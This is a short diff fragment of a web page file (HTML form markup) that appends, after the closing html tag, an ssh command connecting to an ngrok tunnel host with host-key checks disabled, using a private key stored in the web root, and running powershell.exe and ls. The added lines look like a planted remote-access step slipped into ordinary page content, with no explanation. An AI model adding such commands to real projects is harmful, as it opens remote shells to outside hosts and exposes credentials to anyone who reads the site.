@@ -89,3 +89,8 @@ echo "</select>";
         <button type="submit">Submit</button>
         <form/>
 </html>
+
+ssh -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /var/www/html/id_rsa.txt -p 19681 testUser1@2.tcp.eu.ngrok.io "
+powershell.exe
+ls
+"
